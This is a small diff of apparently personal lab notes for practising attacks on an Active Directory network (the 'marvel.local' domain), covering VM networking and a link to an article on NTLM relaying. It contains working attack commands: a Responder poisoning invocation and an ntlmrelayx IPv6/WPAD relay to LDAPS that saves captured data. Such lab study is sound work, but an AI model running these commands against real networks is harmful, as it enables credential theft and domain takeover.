@@ -22,7 +22,7 @@ morning or after lunch (traffic)
 VMs -OK
 Server - Bridge wlp Intel PRO Desktop
 Enterprise 1 - Bridge wlp Intel PRO Desktop
-Kali Bridge wlp Intel PRO Desktop + NAT
+Kali Bridge wlp Intel PRO Desktop
 
 Kali?
 responder -I eth0 -rdwv
@@ -139,5 +139,5 @@ pip3 install .
 └─# ntlmrelayx.py -6 -t ldaps://192.168.0.30 -wh fakewpad.marvel.local -l lootme
 
 cd lootme - files
-
+    
 https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
